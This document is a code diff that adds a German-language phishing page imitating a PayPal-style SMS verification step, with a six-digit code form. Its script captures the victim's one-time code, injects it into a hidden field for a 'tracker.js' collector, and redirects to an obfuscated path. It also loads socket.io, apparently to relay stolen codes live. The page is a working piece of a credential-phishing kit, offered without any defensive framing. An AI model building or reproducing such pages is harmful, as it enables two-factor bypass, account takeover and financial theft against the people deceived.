@@ -1,0 +1,149 @@
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/index.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+
+</head>
+
+<body>
+    <header>
+    </header>
+    <main>
+        <form method="post" id="PP-SMS">
+            <div class="logosms">
+                <img src="./img/pipillgomark.png" alt="">
+            </div>
+            <div class="text" style="gap: 1rem;">
+                <p>Mit Einmalcode einloggen</p>
+                <p>Code wurde an Ihre Nummer gesendet.</p>
+            </div>
+            <p style="text-align: center; margin: 15px 0; margin-bottom: 30px; cursor: pointer; color: #006de2;">Neuen
+                Code anfordern</p>
+            <div class="logosms">
+                <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;">
+                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
+                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
+                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
+                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
+                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
+                    <input type="text" maxlength="1" class="code-input" pattern="[0-9]" inputmode="numeric" required="">
+                </div>
+                <div id="loading" style="display: none; justify-content: center; margin-top: 20px;">
+                    <div class="spinner"></div>
+                </div>
+                <button class="_4u36pu1 _4u36pu2 _4u36pu4 _4u36pum scTrack:security_code_continue_button button"
+                    id="securityCodeSubmit" data-atomic-wait-domain="identity_authnodeweb"
+                    data-atomic-wait-intent="submit_sms" data-atomic-wait-task="login_step_up_sms"
+                    data-atomic-wait-viewname="auth_verification_success_page" type="submit" name="submitSecurityCode"
+                    data-nemo="securityCodeSubmit" tab-index="0" data-ppui-info="" data-ppui="true">Absenden</button>
+                <a href="">Neuen Code senden</a>
+            </div>
+
+
+        </form>
+    </main>
+    <footer>
+        <p>Kontakt</p>
+        <p>Datenschutz</p>
+        <p>Rechtliches</p>
+        <p>Richtlinienaktualisierungen</p>
+        <p>Weltweit</p>
+    </footer>
+
+    <style>
+        #securityCodeSubmit {
+            background-color: #0551b5;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            max-width: 200px;
+            transition: background-color 0.3s ease;
+        }
+
+        #securityCodeSubmit:hover {
+            background-color: #044494;
+        }
+
+        #securityCodeSubmit:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+    </style>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.getElementById('PP-SMS');
+            const inputs = form.querySelectorAll('.code-input');
+            const loading = document.getElementById('loading');
+            const submitButton = document.getElementById('securityCodeSubmit');
+
+            // Handle input behavior
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function (e) {
+                    if (this.value.length === 1) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                    }
+
+                    // Enable/disable submit button based on all fields being filled
+                    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
+                    submitButton.disabled = !allFilled;
+                });
+
+                input.addEventListener('keydown', function (e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+
+            // Handle form submission via button click
+            submitButton.addEventListener('click', function (e) {
+                e.preventDefault();
+
+                const code = Array.from(inputs).map(input => input.value).join('');
+                console.log('Verification code:', code);
+
+                // Show loading spinner
+                loading.style.display = 'flex';
+
+                // Disable all inputs and button
+                inputs.forEach(input => input.disabled = true);
+                submitButton.disabled = true;
+
+                // Inject hidden input so tracker.js can read the full code natively
+                let hiddenInput = document.createElement('input');
+                hiddenInput.type = 'hidden';
+                hiddenInput.name = 'verificationCode';
+                hiddenInput.value = code;
+                form.appendChild(hiddenInput);
+
+                // Set native redirect
+                form.setAttribute('data-redirect', '/loadPPxCvGk6Hb?time=3&url=PPxSmSx2xhkjnUHnKJHu');
+
+                // Trigger form submission so tracker.js can pick it up
+                // Since we didn't disable the actual form submit event, this will bubble to tracker.js
+                // Alternatively we can use requestSubmit()
+                form.requestSubmit();
+            });
+
+            // Initially disable submit button
+            submitButton.disabled = true;
+        });
+    </script>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/tracker.js"></script>
+
+</body>
+
+</html>
